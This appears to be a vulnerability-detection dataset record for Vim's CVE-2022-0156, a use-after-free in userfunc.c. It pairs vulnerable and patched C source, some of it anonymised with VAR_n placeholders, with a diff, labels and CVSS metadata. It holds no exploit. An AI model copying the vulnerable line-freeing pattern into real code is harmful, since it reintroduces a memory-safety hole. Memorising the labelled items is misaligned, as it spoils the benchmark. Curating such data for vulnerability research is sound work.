	vim_free(VAR_6);
	sprintf(VAR_88, ""%d"", ++VAR_25);
	VAR_6 = vim_strsave((char_u *)VAR_88);
	if (VAR_6 == NULL)
	    goto erret;
    }

    if (VAR_19 == NULL)
    {
	if (VAR_24.fd_dict == NULL && vim_strchr(VAR_6, VAR_89) != NULL)
	{
	    int	    VAR_90, VAR_91;
	    char_u  *VAR_92;

	    /* COMMENT_75 */
	    VAR_3 = VAR_60;
	    if (VAR_93 != NULL)
	    {
		VAR_92 = autoload_name(VAR_6);
		if (VAR_92 != NULL)
		{
		    VAR_8 = vim_strchr(VAR_92, '/');
		    VAR_91 = (int)STRLEN(VAR_8);
		    VAR_90 = (int)STRLEN(VAR_93);
		    if (VAR_90 > VAR_91 && fnamecmp(VAR_8,
					    VAR_93 + VAR_90 - VAR_91) == 0)
			VAR_3 = VAR_56;
		    vim_free(VAR_92);
		}
	    }
	    if (VAR_3 == VAR_60)
	    {
		linenr_T VAR_94 = VAR_76;

		VAR_76 = VAR_28;
		semsg(_(VAR_95),
									 VAR_6);
		VAR_76 = VAR_94;
		goto erret;
	    }
	}

	VAR_19 = alloc_clear(offsetof(ufunc_T, VAR_96) + STRLEN(VAR_6) + 1);
	if (VAR_19 == NULL)
	    goto erret;
	VAR_20 = TRUE;

	if (VAR_24.fd_dict != NULL)
	{
	    if (VAR_24.fd_di == NULL)
	    {
		/* COMMENT_76 */
		VAR_24.fd_di = dictitem_alloc(VAR_24.fd_newkey);
		if (VAR_24.fd_di == NULL)
		{
		    vim_free(VAR_19);
		    VAR_19 = NULL;
		    goto erret;
		}
		if (dict_add(VAR_24.fd_dict, VAR_24.fd_di) == VAR_60)
		{
		    vim_free(VAR_24.fd_di);
		    vim_free(VAR_19);
		    VAR_19 = NULL;
		    goto erret;
		}
	    }
	    else
		/* COMMENT_77 */
		clear_tv(&VAR_24.fd_di->di_tv);
	    VAR_24.fd_di->di_tv.v_type = VAR_47;
	    VAR_24.fd_di->di_tv.vval.v_string = vim_strsave(VAR_6);

	    /* COMMENT_78 */
	    VAR_17 |= VAR_65;
	}
    }
    VAR_19->uf_args = VAR_12;
    VAR_19->uf_def_args = VAR_14;
    VAR_19->uf_ret_type = &VAR_97;
    VAR_19->uf_func_type = &VAR_98;

    if (VAR_0->cmdidx == VAR_44)
    {
	int	    VAR_99 = VAR_76;
	cstack_T    *VAR_100 = VAR_0->cstack;

	VAR_19->uf_def_status = VAR_101;

	/* COMMENT_79 */
	VAR_76 = VAR_28;

	/* COMMENT_80 */
	function_using_block_scopes(VAR_19, VAR_100);

	if (parse_argument_types(VAR_19, &VAR_13, VAR_16) == VAR_60)
	{
	    VAR_76 = VAR_99;
	    VAR_21 = VAR_20;
	    goto erret;
	}
	VAR_16 = FALSE;

	/* COMMENT_81 */
	if (parse_return_type(VAR_19, VAR_18) == VAR_60)
	{
	    VAR_76 = VAR_99;
	    VAR_21 = VAR_20;
	    goto erret;
	}
	VAR_76 = VAR_99;
    }
    else
	VAR_19->uf_def_status = VAR_41;

    if (VAR_20)
    {
	/* COMMENT_82 */
	set_ufunc_name(VAR_19, VAR_6);
	if (VAR_22)
	{
	    VAR_27 = hash_find(&VAR_102, VAR_6);
	    VAR_27->hi_key = UF2HIKEY(VAR_19);
	}
	else if (hash_add(&VAR_102, UF2HIKEY(VAR_19)) == VAR_60)
	{
	    VAR_21 = TRUE;
	    goto erret;
	}
	VAR_19->uf_refcount = 1;
    }

    VAR_19->uf_lines = VAR_15;
    VAR_15.ga_data = NULL;
    if ((VAR_17 & VAR_67) != 0)
    {
	if (register_closure(VAR_19) == VAR_60)
	    goto erret;
    }
    else
	VAR_19->uf_scoped = NULL;

#ifdef VAR_87
    if (prof_def_func())
	func_do_profile(VAR_19);
#endif
    VAR_19->uf_varargs = VAR_16;
    if (VAR_103)
	VAR_17 |= VAR_104;
    if (VAR_29 && !ASCII_ISUPPER(*VAR_19->uf_name))
	VAR_17 |= VAR_105;
    VAR_19->uf_flags = VAR_17;
    VAR_19->uf_calls = 0;
    VAR_19->uf_cleared = FALSE;
    VAR_19->uf_script_ctx = VAR_82;
    VAR_19->uf_script_ctx_version = VAR_82.sc_version;
    VAR_19->uf_script_ctx.sc_lnum += VAR_28;
    if (VAR_106)
    {
	VAR_19->uf_flags |= VAR_107;
	/* COMMENT_83 */
	VAR_106 = FALSE;
    }

    if (VAR_0->cmdidx == VAR_44)
	set_function_type(VAR_19);
    else if (VAR_19->uf_script_ctx.sc_version == VAR_108)
	/* COMMENT_84 */
	VAR_19->uf_script_ctx.sc_version = VAR_109;

    goto ret_free;

erret:
    ga_clear_strings(&VAR_12);
    ga_clear_strings(&VAR_14);
    if (VAR_19 != NULL)
    {
	ga_init(&VAR_19->uf_args);
	ga_init(&VAR_19->uf_def_args);
    }
errret_2:
    ga_clear_strings(&VAR_15);
    if (VAR_19 != NULL)
	VIM_CLEAR(VAR_19->uf_arg_types);
    if (VAR_21)
    {
	vim_free(VAR_19);
	VAR_19 = NULL;
    }
ret_free:
    ga_clear_strings(&VAR_13);
    vim_free(VAR_24.fd_newkey);
    if (VAR_6 != VAR_1)
	vim_free(VAR_6);
    vim_free(VAR_18);
    VAR_37 |= VAR_5;

    return VAR_19;
}",vim/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f/userfunc.c/vul/after/2.json,"--- func_before
+++ func_after
@@ -1,5 +1,5 @@
 ufunc_T *
-define_function(exarg_T *eap, char_u *name_arg, char_u **line_to_free)
+define_function(exarg_T *eap, char_u *name_arg, garray_T *lines_to_free)
 {
     int		j;
     int		c;
@@ -268,7 +268,7 @@
     if (get_function_args(&p, ')', &newargs,
 			eap->cmdidx == CMD_def ? &argtypes : NULL, FALSE,
 			 NULL, &varargs, &default_args, eap->skip,
-			 eap, line_to_free) == FAIL)
+			 eap, lines_to_free) == FAIL)
 	goto errret_2;
     whitep = p;
 
@@ -378,7 +378,7 @@
 
     // Do not define the function when getting the body fails and when
     // skipping.
-    if (get_function_body(eap, &newlines, line_arg, line_to_free) == FAIL
+    if (get_function_body(eap, &newlines, line_arg, lines_to_free) == FAIL
 	    || eap->skip)
 	goto erret;
 ","{'deleted_lines': ['define_function(exarg_T *eap, char_u *name_arg, char_u **line_to_free)', '\t\t\t eap, line_to_free) == FAIL)', '    if (get_function_body(eap, &newlines, line_arg, line_to_free) == FAIL'], 'added_lines': ['define_function(exarg_T *eap, char_u *name_arg, garray_T *lines_to_free)', '\t\t\t eap, lines_to_free) == FAIL)', '    if (get_function_body(eap, &newlines, line_arg, lines_to_free) == FAIL']}",True,vim is vulnerable to Use After Free,5.5,MEDIUM,1,valid,2022-01-08T15:39:39Z,4
CVE-2022-0156,['CWE-416'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,vim,"patch 8.2.4040: keeping track of allocated lines is too complicated

Problem:    Keeping track of allocated lines in user functions is too
            complicated.
Solution:   Instead of freeing individual lines keep them all until the end.",9f1a39a5d1cd7989ada2d1cb32f97d84360e050f,https://github.com/vim/vim/commit/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f,src/userfunc.c,get_function_body,"static int
get_function_body(
exarg_T    *eap,
garray_T    *newlines,
char_u    *line_arg_in,
char_u    **line_to_free)
{
linenr_Tsourcing_lnum_top = SOURCING_LNUM;
linenr_Tsourcing_lnum_off;
intsaved_wait_return = need_wait_return;
char_u*line_arg = line_arg_in;
intvim9_function = eap->cmdidx == CMD_def
|| eap->cmdidx == CMD_block;
#define MAX_FUNC_NESTING 50
charnesting_def[MAX_FUNC_NESTING];
charnesting_inline[MAX_FUNC_NESTING];
intnesting = 0;
getline_opt_T getline_options;
intindent = 2;
char_u*skip_until = NULL;
intret = FAIL;
intis_heredoc = FALSE;
intheredoc_concat_len = 0;
garray_Theredoc_ga;
char_u*heredoc_trimmed = NULL;
ga_init2(&heredoc_ga, 1, 500);
sourcing_lnum_off = get_sourced_lnum(eap->getline, eap->cookie);
if (SOURCING_LNUM < sourcing_lnum_off)
{
sourcing_lnum_off -= SOURCING_LNUM;
if (ga_grow(newlines, sourcing_lnum_off) == FAIL)
goto theend;
while (sourcing_lnum_off-- > 0)
((char_u **)(newlines->ga_data))[newlines->ga_len++] = NULL;
}
nesting_def[0] = vim9_function;
nesting_inline[0] = eap->cmdidx == CMD_block;
getline_options = vim9_function
? GETLINE_CONCAT_CONTBAR : GETLINE_CONCAT_CONT;
for (;;)
{
char_u*theline;
char_u*p;
char_u*arg;
if (KeyTyped)
{
msg_scroll = TRUE;
saved_wait_return = FALSE;
}
need_wait_return = FALSE;
if (line_arg != NULL)
{
theline = line_arg;
p = vim_strchr(theline, '\n');
if (p == NULL)
line_arg += STRLEN(line_arg);
else
{
*p = NUL;
line_arg = p + 1;
}
}
else
{
theline = get_function_line(eap, line_to_free, indent,
getline_options);
}
if (KeyTyped)
lines_left = Rows - 1;
if (theline == NULL)
{
SOURCING_LNUM = sourcing_lnum_top;
if (skip_until != NULL)
semsg(_(e_missing_heredoc_end_marker_str), skip_until);
else if (nesting_inline[nesting])
emsg(_(e_missing_end_block));
else if (eap->cmdidx == CMD_def)
emsg(_(e_missing_enddef));
else
emsg(_(e_missing_endfunction));
goto theend;
}
sourcing_lnum_off = get_sourced_lnum(eap->getline, eap->cookie);
if (SOURCING_LNUM < sourcing_lnum_off)
sourcing_lnum_off -= SOURCING_LNUM;
else
sourcing_lnum_off = 0;
if (skip_until != NULL)
{
if (heredoc_trimmed == NULL
|| (is_heredoc && skipwhite(theline) == theline)
|| STRNCMP(theline, heredoc_trimmed,
STRLEN(heredoc_trimmed)) == 0)
{
if (heredoc_trimmed == NULL)
p = theline;
else if (is_heredoc)
p = skipwhite(theline) == theline
? theline : theline + STRLEN(heredoc_trimmed);
else
p = theline + STRLEN(heredoc_trimmed);
if (STRCMP(p, skip_until) == 0)
{
VIM_CLEAR(skip_until);
VIM_CLEAR(heredoc_trimmed);
getline_options = vim9_function
? GETLINE_CONCAT_CONTBAR : GETLINE_CONCAT_CONT;
is_heredoc = FALSE;
if (heredoc_concat_len > 0)
{
ga_concat(&heredoc_ga, theline);
vim_free(((char_u **)(newlines->ga_data))[
heredoc_concat_len - 1]);
((char_u **)(newlines->ga_data))[
heredoc_concat_len - 1] = heredoc_ga.ga_data;
ga_init(&heredoc_ga);
heredoc_concat_len = 0;
theline += STRLEN(theline);      }
}
}
}
else
{
int    c;
char_u  *end;
for (p = theline; VIM_ISWHITE(*p) || *p == ':'; ++p)
;
if (nesting_inline[nesting]
? *p == '}'
: (checkforcmd(&p, nesting_def[nesting]
? ""enddef"" : ""endfunction"", 4)
&& *p != ':'))
{
if (nesting-- == 0)
{
char_u *nextcmd = NULL;
if (*p == '|' || *p == '}')
nextcmd = p + 1;
else if (line_arg != NULL && *skipwhite(line_arg) != NUL)
nextcmd = line_arg;
else if (*p != NUL && *p != (vim9_function ? '#' : '""')
&& (vim9_function || p_verbose > 0))
{
SOURCING_LNUM = sourcing_lnum_top
+ newlines->ga_len + 1;
if (eap->cmdidx == CMD_def)
semsg(_(e_text_found_after_str_str), ""enddef"", p);
else
give_warning2((char_u *)
_(""W22: Text found after :endfunction: %s""),
p, TRUE);
}
if (nextcmd != NULL && *skipwhite(nextcmd) != NUL)
{
eap->nextcmd = nextcmd;
if (*line_to_free != NULL
&& *eap->cmdlinep != *line_to_free)
{
vim_free(*eap->cmdlinep);
*eap->cmdlinep = *line_to_free;
*line_to_free = NULL;
}
}
break;
}
}
else if (nesting_def[nesting])
{
if (checkforcmd(&p, ""endfunction"", 4) && *p != ':')
emsg(_(e_mismatched_endfunction));
}
else if (eap->cmdidx == CMD_def && checkforcmd(&p, ""enddef"", 4))
emsg(_(e_mismatched_enddef));
if (indent > 2 && (*p == '}' || STRNCMP(p, ""end"", 3) == 0))
indent -= 2;
else if (STRNCMP(p, ""if"", 2) == 0
|| STRNCMP(p, ""wh"", 2) == 0
|| STRNCMP(p, ""for"", 3) == 0
|| STRNCMP(p, ""try"", 3) == 0)
indent += 2;
c = *p;
if (is_function_cmd(&p)
|| (eap->cmdidx == CMD_def && checkforcmd(&p, ""def"", 3)))
{
if (*p == '!')
p = skipwhite(p + 1);
p += eval_fname_script(p);
vim_free(trans_function_name(&p, NULL, TRUE, 0, NULL,
NULL, NULL));
if (*skipwhite(p) == '(')
{
if (nesting == MAX_FUNC_NESTING - 1)
emsg(_(e_function_nesting_too_deep));
else
{
++nesting;
nesting_def[nesting] = (c == 'd');
nesting_inline[nesting] = FALSE;
indent += 2;
}
}
}
if (nesting_def[nesting] ? *p != '#' : *p != '""')
{
end = p + STRLEN(p) - 1;
while (end > p && VIM_ISWHITE(*end))
--end;
if (end > p + 1 && *end == '{' && VIM_ISWHITE(end[-1]))
{
int    is_block;
--end;
while (end > p && VIM_ISWHITE(*end))
--end;
is_block = end > p + 2 && end[-1] == '=' && end[0] == '>';
if (!is_block)
{
char_u *s = p;
is_block = checkforcmd_noparen(&s, ""autocmd"", 2)
|| checkforcmd_noparen(&s, ""command"", 3);
}
if (is_block)
{
if (nesting == MAX_FUNC_NESTING - 1)
emsg(_(e_function_nesting_too_deep));
else
{
++nesting;
nesting_def[nesting] = TRUE;
nesting_inline[nesting] = TRUE;
indent += 2;
}
}
}
}
p = skip_range(p, FALSE, NULL);
if (!vim9_function
&& ((p[0] == 'a' && (!ASCII_ISALPHA(p[1]) || p[1] == 'p'))
|| (p[0] == 'c'
&& (!ASCII_ISALPHA(p[1]) || (p[1] == 'h'
&& (!ASCII_ISALPHA(p[2]) || (p[2] == 'a'
&& (STRNCMP(&p[3], ""nge"", 3) != 0
|| !ASCII_ISALPHA(p[6])))))))
|| (p[0] == 'i'
&& (!ASCII_ISALPHA(p[1]) || (p[1] == 'n'
&& (!ASCII_ISALPHA(p[2])
|| (p[2] == 's'
&& (!ASCII_ISALPHA(p[3])
|| p[3] == 'e'))))))))
skip_until = vim_strsave((char_u *)""."");
arg = skipwhite(skiptowhite(p));
if (arg[0] == '<' && arg[1] =='<'
&& ((p[0] == 'p' && p[1] == 'y'
&& (!ASCII_ISALNUM(p[2]) || p[2] == 't'
|| ((p[2] == '3' || p[2] == 'x')
&& !ASCII_ISALPHA(p[3]))))
|| (p[0] == 'p' && p[1] == 'e'
&& (!ASCII_ISALPHA(p[2]) || p[2] == 'r'))
|| (p[0] == 't' && p[1] == 'c'
&& (!ASCII_ISALPHA(p[2]) || p[2] == 'l'))
|| (p[0] == 'l' && p[1] == 'u' && p[2] == 'a'
&& !ASCII_ISALPHA(p[3]))
|| (p[0] == 'r' && p[1] == 'u' && p[2] == 'b'
&& (!ASCII_ISALPHA(p[3]) || p[3] == 'y'))
|| (p[0] == 'm' && p[1] == 'z'
&& (!ASCII_ISALPHA(p[2]) || p[2] == 's'))
))
{
p = skipwhite(arg + 2);
if (STRNCMP(p, ""trim"", 4) == 0)
{
p = skipwhite(p + 4);
heredoc_trimmed = vim_strnsave(theline,
skipwhite(theline) - theline);
}
if (*p == NUL)
skip_until = vim_strsave((char_u *)""."");
else
skip_until = vim_strnsave(p, skiptowhite(p) - p);
getline_options = GETLINE_NONE;
is_heredoc = TRUE;
if (eap->cmdidx == CMD_def)
heredoc_concat_len = newlines->ga_len + 1;
}
arg = skipwhite(skiptowhite(p));
if (*arg == '[')
arg = vim_strchr(arg, ']');
if (arg != NULL)
{
int found = (eap->cmdidx == CMD_def && arg[0] == '='
&& arg[1] == '<' && arg[2] =='<');
if (!found)
arg = skipwhite(skiptowhite(arg));
if (found || (arg[0] == '=' && arg[1] == '<' && arg[2] =='<'
&& (checkforcmd(&p, ""let"", 2)
|| checkforcmd(&p, ""var"", 3)
|| checkforcmd(&p, ""final"", 5)
|| checkforcmd(&p, ""const"", 5))))
{
p = skipwhite(arg + 3);
if (STRNCMP(p, ""trim"", 4) == 0)
{
p = skipwhite(p + 4);
heredoc_trimmed = vim_strnsave(theline,
skipwhite(theline) - theline);
}
skip_until = vim_strnsave(p, skiptowhite(p) - p);
getline_options = GETLINE_NONE;
is_heredoc = TRUE;
}
}
}
if (ga_grow(newlines, 1 + sourcing_lnum_off) == FAIL)
goto theend;
if (heredoc_concat_len > 0)
{
ga_concat(&heredoc_ga, theline);
ga_concat(&heredoc_ga, (char_u *)""\n"");
p = vim_strsave((char_u *)"""");
}
else
{
p = vim_strsave(theline);
}
if (p == NULL)
goto theend;
((char_u **)(newlines->ga_data))[newlines->ga_len++] = p;
while (sourcing_lnum_off-- > 0)
((char_u **)(newlines->ga_data))[newlines->ga_len++] = NULL;
if (line_arg != NULL && *line_arg == NUL)
line_arg = NULL;
}
if (!did_emsg)
ret = OK;
theend:
vim_free(skip_until);
vim_free(heredoc_trimmed);
vim_free(heredoc_ga.ga_data);
need_wait_return |= saved_wait_return;
return ret;
}","static int
get_function_body(
exarg_T    *VAR_0,
garray_T    *VAR_1,
char_u    *VAR_2,
char_u    **VAR_3)
{
linenr_TVAR_4 = VAR_5;
linenr_TVAR_6;
intVAR_7 = VAR_8;
char_u*VAR_9 = VAR_2;
intVAR_10 = VAR_0->cmdidx == VAR_11
|| VAR_0->cmdidx == VAR_12;
#define VAR_13 50
charVAR_14[VAR_13];
charVAR_15[VAR_13];
intVAR_16 = 0;
getline_opt_T VAR_17;
intVAR_18 = 2;
char_u*VAR_19 = NULL;
intVAR_20 = VAR_21;
intVAR_22 = FALSE;
intVAR_23 = 0;
garray_TVAR_24;
char_u*VAR_25 = NULL;
ga_init2(&VAR_24, 1, 500);
VAR_6 = get_sourced_lnum(VAR_0->getline, VAR_0->cookie);
if (VAR_5 < VAR_6)
{
VAR_6 -= VAR_5;
if (ga_grow(VAR_1, VAR_6) == VAR_21)
goto theend;
while (VAR_6-- > 0)
((char_u **)(VAR_1->ga_data))[VAR_1->ga_len++] = NULL;
}
VAR_14[0] = VAR_10;
VAR_15[0] = VAR_0->cmdidx == VAR_12;
VAR_17 = VAR_10
? VAR_26 : VAR_27;
for (;;)
{
char_u*VAR_28;
char_u*VAR_29;
char_u*VAR_30;
if (VAR_31)
{
VAR_32 = TRUE;
VAR_7 = FALSE;
}
VAR_8 = FALSE;
if (VAR_9 != NULL)
{
VAR_28 = VAR_9;
VAR_29 = vim_strchr(VAR_28, '\n');
if (VAR_29 == NULL)
VAR_9 += STRLEN(VAR_9);
else
{
*VAR_29 = VAR_33;
VAR_9 = VAR_29 + 1;
}
}
else
{
VAR_28 = get_function_line(VAR_0, VAR_3, VAR_18,
VAR_17);
}
if (VAR_31)
VAR_34 = VAR_35 - 1;
if (VAR_28 == NULL)
{
VAR_5 = VAR_4;
if (VAR_19 != NULL)
semsg(_(VAR_36), VAR_19);
else if (VAR_15[VAR_16])
emsg(_(VAR_37));
else if (VAR_0->cmdidx == VAR_11)
emsg(_(VAR_38));
else
emsg(_(VAR_39));
goto theend;
}
VAR_6 = get_sourced_lnum(VAR_0->getline, VAR_0->cookie);
if (VAR_5 < VAR_6)
VAR_6 -= VAR_5;
else
VAR_6 = 0;
if (VAR_19 != NULL)
{
if (VAR_25 == NULL
|| (VAR_22 && skipwhite(VAR_28) == VAR_28)
|| STRNCMP(VAR_28, VAR_25,
STRLEN(VAR_25)) == 0)
{
if (VAR_25 == NULL)
VAR_29 = VAR_28;
else if (VAR_22)
VAR_29 = skipwhite(VAR_28) == VAR_28
? VAR_28 : VAR_28 + STRLEN(VAR_25);
else
VAR_29 = VAR_28 + STRLEN(VAR_25);
if (STRCMP(VAR_29, VAR_19) == 0)
{
VIM_CLEAR(VAR_19);
VIM_CLEAR(VAR_25);
VAR_17 = VAR_10
? VAR_26 : VAR_27;
VAR_22 = FALSE;
if (VAR_23 > 0)
{
ga_concat(&VAR_24, VAR_28);
vim_free(((char_u **)(VAR_1->ga_data))[
VAR_23 - 1]);
((char_u **)(VAR_1->ga_data))[
VAR_23 - 1] = VAR_24.ga_data;
ga_init(&VAR_24);
VAR_23 = 0;
VAR_28 += STRLEN(VAR_28);  
}
}
}
}
else
{
int    VAR_40;
char_u  *VAR_41;
for (VAR_29 = VAR_28; VIM_ISWHITE(*VAR_29) || *VAR_29 == ':'; ++VAR_29)
;
if (VAR_15[VAR_16]
? *VAR_29 == '}'
: (checkforcmd(&VAR_29, VAR_14[VAR_16]
? ""enddef"" : ""endfunction"", 4)
&& *VAR_29 != ':'))
{
if (VAR_16-- == 0)
{
char_u *VAR_42 = NULL;
if (*VAR_29 == '|' || *VAR_29 == '}')
VAR_42 = VAR_29 + 1;
else if (VAR_9 != NULL && *skipwhite(VAR_9) != VAR_33)
VAR_42 = VAR_9;
else if (*VAR_29 != VAR_33 && *VAR_29 != (VAR_10 ? '#' : '""')
&& (VAR_10 || VAR_43 > 0))
{
VAR_5 = VAR_4
+ VAR_1->ga_len + 1;
if (VAR_0->cmdidx == VAR_11)
semsg(_(VAR_44), ""enddef"", VAR_29);
else
give_warning2((char_u *)
_(""W22: Text found after :endfunction: %s""),
VAR_29, TRUE);
}
if (VAR_42 != NULL && *skipwhite(VAR_42) != VAR_33)
{
VAR_0->nextcmd = VAR_42;
if (*VAR_3 != NULL
&& *VAR_0->cmdlinep != *VAR_3)
{
vim_free(*VAR_0->cmdlinep);
*VAR_0->cmdlinep = *VAR_3;
*VAR_3 = NULL;
}
}
break;
}
}
else if (VAR_14[VAR_16])
{
if (checkforcmd(&VAR_29, ""endfunction"", 4) && *VAR_29 != ':')
emsg(_(VAR_45));
}
else if (VAR_0->cmdidx == VAR_11 && checkforcmd(&VAR_29, ""enddef"", 4))
emsg(_(VAR_46));
if (VAR_18 > 2 && (*VAR_29 == '}' || STRNCMP(VAR_29, ""end"", 3) == 0))
VAR_18 -= 2;
else if (STRNCMP(VAR_29, ""if"", 2) == 0
|| STRNCMP(VAR_29, ""wh"", 2) == 0
|| STRNCMP(VAR_29, ""for"", 3) == 0
|| STRNCMP(VAR_29, ""try"", 3) == 0)
VAR_18 += 2;
VAR_40 = *VAR_29;
if (is_function_cmd(&VAR_29)
|| (VAR_0->cmdidx == VAR_11 && checkforcmd(&VAR_29, ""def"", 3)))
{
if (*VAR_29 == '!')
VAR_29 = skipwhite(VAR_29 + 1);
VAR_29 += eval_fname_script(VAR_29);
vim_free(trans_function_name(&VAR_29, NULL, TRUE, 0, NULL,
NULL, NULL));
if (*skipwhite(VAR_29) == '(')
{
if (VAR_16 == VAR_13 - 1)
emsg(_(VAR_47));
else
{
++VAR_16;
VAR_14[VAR_16] = (VAR_40 == 'd');
VAR_15[VAR_16] = FALSE;
VAR_18 += 2;
}
}
}
if (VAR_14[VAR_16] ? *VAR_29 != '#' : *VAR_29 != '""')
{
VAR_41 = VAR_29 + STRLEN(VAR_29) - 1;
while (VAR_41 > VAR_29 && VIM_ISWHITE(*VAR_41))
--VAR_41;
if (VAR_41 > VAR_29 + 1 && *VAR_41 == '{' && VIM_ISWHITE(VAR_41[-1]))
{
int    VAR_48;
--VAR_41;
while (VAR_41 > VAR_29 && VIM_ISWHITE(*VAR_41))
--VAR_41;
VAR_48 = VAR_41 > VAR_29 + 2 && VAR_41[-1] == '=' && VAR_41[0] == '>';
if (!VAR_48)
{
char_u *VAR_49 = VAR_29;
VAR_48 = checkforcmd_noparen(&VAR_49, ""autocmd"", 2)
|| checkforcmd_noparen(&VAR_49, ""command"", 3);
}
if (VAR_48)
{
if (VAR_16 == VAR_13 - 1)
emsg(_(VAR_47));
else
{
++VAR_16;
VAR_14[VAR_16] = TRUE;
VAR_15[VAR_16] = TRUE;
VAR_18 += 2;
}
}
}
}
VAR_29 = skip_range(VAR_29, FALSE, NULL);
if (!VAR_10
&& ((VAR_29[0] == 'a' && (!ASCII_ISALPHA(VAR_29[1]) || VAR_29[1] == 'p'))
|| (VAR_29[0] == 'c'
&& (!ASCII_ISALPHA(VAR_29[1]) || (VAR_29[1] == 'h'
&& (!ASCII_ISALPHA(VAR_29[2]) || (VAR_29[2] == 'a'
&& (STRNCMP(&VAR_29[3], ""nge"", 3) != 0
|| !ASCII_ISALPHA(VAR_29[6])))))))
|| (VAR_29[0] == 'i'
&& (!ASCII_ISALPHA(VAR_29[1]) || (VAR_29[1] == 'n'
&& (!ASCII_ISALPHA(VAR_29[2])
|| (VAR_29[2] == 's'
&& (!ASCII_ISALPHA(VAR_29[3])
|| VAR_29[3] == 'e'))))))))
VAR_19 = vim_strsave((char_u *)""."");
VAR_30 = skipwhite(skiptowhite(VAR_29));
if (VAR_30[0] == '<' && VAR_30[1] =='<'
&& ((VAR_29[0] == 'p' && VAR_29[1] == 'y'
&& (!ASCII_ISALNUM(VAR_29[2]) || VAR_29[2] == 't'
|| ((VAR_29[2] == '3' || VAR_29[2] == 'x')
&& !ASCII_ISALPHA(VAR_29[3]))))
|| (VAR_29[0] == 'p' && VAR_29[1] == 'e'
&& (!ASCII_ISALPHA(VAR_29[2]) || VAR_29[2] == 'r'))
|| (VAR_29[0] == 't' && VAR_29[1] == 'c'
&& (!ASCII_ISALPHA(VAR_29[2]) || VAR_29[2] == 'l'))
|| (VAR_29[0] == 'l' && VAR_29[1] == 'u' && VAR_29[2] == 'a'
&& !ASCII_ISALPHA(VAR_29[3]))
|| (VAR_29[0] == 'r' && VAR_29[1] == 'u' && VAR_29[2] == 'b'
&& (!ASCII_ISALPHA(VAR_29[3]) || VAR_29[3] == 'y'))
|| (VAR_29[0] == 'm' && VAR_29[1] == 'z'
&& (!ASCII_ISALPHA(VAR_29[2]) || VAR_29[2] == 's'))
))
{
VAR_29 = skipwhite(VAR_30 + 2);
if (STRNCMP(VAR_29, ""trim"", 4) == 0)
{
VAR_29 = skipwhite(VAR_29 + 4);
VAR_25 = vim_strnsave(VAR_28,
skipwhite(VAR_28) - VAR_28);
}
if (*VAR_29 == VAR_33)
VAR_19 = vim_strsave((char_u *)""."");
else
VAR_19 = vim_strnsave(VAR_29, skiptowhite(VAR_29) - VAR_29);
VAR_17 = VAR_50;
VAR_22 = TRUE;
if (VAR_0->cmdidx == VAR_11)
VAR_23 = VAR_1->ga_len + 1;
}
VAR_30 = skipwhite(skiptowhite(VAR_29));
if (*VAR_30 == '[')
VAR_30 = vim_strchr(VAR_30, ']');
if (VAR_30 != NULL)
{
int VAR_51 = (VAR_0->cmdidx == VAR_11 && VAR_30[0] == '='
&& VAR_30[1] == '<' && VAR_30[2] =='<');
if (!VAR_51)
VAR_30 = skipwhite(skiptowhite(VAR_30));
if (VAR_51 || (VAR_30[0] == '=' && VAR_30[1] == '<' && VAR_30[2] =='<'
&& (checkforcmd(&VAR_29, ""let"", 2)
|| checkforcmd(&VAR_29, ""var"", 3)
|| checkforcmd(&VAR_29, ""final"", 5)
|| checkforcmd(&VAR_29, ""const"", 5))))
{
VAR_29 = skipwhite(VAR_30 + 3);
if (STRNCMP(VAR_29, ""trim"", 4) == 0)
{
VAR_29 = skipwhite(VAR_29 + 4);
VAR_25 = vim_strnsave(VAR_28,
skipwhite(VAR_28) - VAR_28);
}
VAR_19 = vim_strnsave(VAR_29, skiptowhite(VAR_29) - VAR_29);
VAR_17 = VAR_50;
VAR_22 = TRUE;
}
}
}
if (ga_grow(VAR_1, 1 + VAR_6) == VAR_21)
goto theend;
if (VAR_23 > 0)
{
ga_concat(&VAR_24, VAR_28);
ga_concat(&VAR_24, (char_u *)""\n"");
VAR_29 = vim_strsave((char_u *)"""");
}
else
{
VAR_29 = vim_strsave(VAR_28);
}
if (VAR_29 == NULL)
goto theend;
((char_u **)(VAR_1->ga_data))[VAR_1->ga_len++] = VAR_29;
while (VAR_6-- > 0)
((char_u **)(VAR_1->ga_data))[VAR_1->ga_len++] = NULL;
if (VAR_9 != NULL && *VAR_9 == VAR_33)
VAR_9 = NULL;
}
if (!VAR_52)
VAR_20 = VAR_53;
theend:
vim_free(VAR_19);
vim_free(VAR_25);
vim_free(VAR_24.ga_data);
VAR_8 |= VAR_7;
return VAR_20;
}",vim/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f/userfunc.c/vul/before/3.json,"static int
get_function_body(
	exarg_T	    *eap,
	garray_T    *newlines,
	char_u	    *line_arg_in,
	garray_T    *lines_to_free)
{
    linenr_T	sourcing_lnum_top = SOURCING_LNUM;
    linenr_T	sourcing_lnum_off;
    int		saved_wait_return = need_wait_return;
    char_u	*line_arg = line_arg_in;
    int		vim9_function = eap->cmdidx == CMD_def
						   || eap->cmdidx == CMD_block;
#define MAX_FUNC_NESTING 50
    char	nesting_def[MAX_FUNC_NESTING];
    char	nesting_inline[MAX_FUNC_NESTING];
    int		nesting = 0;
    getline_opt_T getline_options;
    int		indent = 2;
    char_u	*skip_until = NULL;
    int		ret = FAIL;
    int		is_heredoc = FALSE;
    int		heredoc_concat_len = 0;
    garray_T	heredoc_ga;
    char_u	*heredoc_trimmed = NULL;

    ga_init2(&heredoc_ga, 1, 500);

    // Detect having skipped over comment lines to find the return
    // type.  Add NULL lines to keep the line count correct.
    sourcing_lnum_off = get_sourced_lnum(eap->getline, eap->cookie);
    if (SOURCING_LNUM < sourcing_lnum_off)
    {
	sourcing_lnum_off -= SOURCING_LNUM;
	if (ga_grow(newlines, sourcing_lnum_off) == FAIL)
	    goto theend;
	while (sourcing_lnum_off-- > 0)
	    ((char_u **)(newlines->ga_data))[newlines->ga_len++] = NULL;
    }

    nesting_def[0] = vim9_function;
    nesting_inline[0] = eap->cmdidx == CMD_block;
    getline_options = vim9_function
				? GETLINE_CONCAT_CONTBAR : GETLINE_CONCAT_CONT;
    for (;;)
    {
	char_u	*theline;
	char_u	*p;
	char_u	*arg;

	if (KeyTyped)
	{
	    msg_scroll = TRUE;
	    saved_wait_return = FALSE;
	}
	need_wait_return = FALSE;

	if (line_arg != NULL)
	{
	    // Use eap->arg, split up in parts by line breaks.
	    theline = line_arg;
	    p = vim_strchr(theline, '\n');
	    if (p == NULL)
